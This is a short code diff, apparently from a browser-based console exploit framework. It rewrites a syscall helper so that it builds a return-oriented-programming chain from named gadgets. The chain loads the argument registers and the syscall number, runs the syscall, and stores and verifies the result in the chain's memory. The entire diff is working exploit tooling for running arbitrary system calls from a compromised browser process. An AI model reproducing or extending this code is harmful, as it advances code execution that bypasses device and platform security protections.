@@ -253,8 +253,35 @@
           throw new Error("System call map does not contain an index for this syscall!");
         }
 
-        return p.call(libkernel.add32(off), rdi, rsi, rdx, rcx, r8, r9);
-      }
+        var chain = new rop(p);
+        chain.push(window.gadgets["pop rdi"]);
+        chain.push(rdi);
+        chain.push(window.gadgets["pop rsi"]);
+        chain.push(rsi);
+        chain.push(window.gadgets["pop rdx"]);
+        chain.push(rdx);
+        chain.push(window.gadgets["pop rcx"]);
+        chain.push(rcx);
+        chain.push(window.gadgets["pop r8"]);
+        chain.push(r8);
+        chain.push(window.gadgets["pop r9"]);
+        chain.push(r9);
+        chain.push(window.gadgets["pop rax"]);
+        chain.push(sysc);
+        chain.push(window.gadgets["syscall"]);
+
+        chain.push(window.gadgets["pop rdi"]);
+        chain.push(chain.ropChainPtr.add32(0x3ff8));
+        chain.push(window.gadgets["mov qword ptr [rdi], rax"]);
+        chain.push(window.gadgets["pop rax"]);
+        chain.push(p.leakval(0x41414242));
+        if (chain.run().low != 0x41414242) throw new Error("unexpected rop behaviour");
+
+        /*
+          Originally for some reason, it will read in hex, so .toString(10)
+          converts back to decimal.
+        */
+        return p.read8(chain.ropChainPtr.add32(0x3ff8)).toString(10);      }
 
       p.readstr = function(addr){
         var addr_ = addr.add32(0);
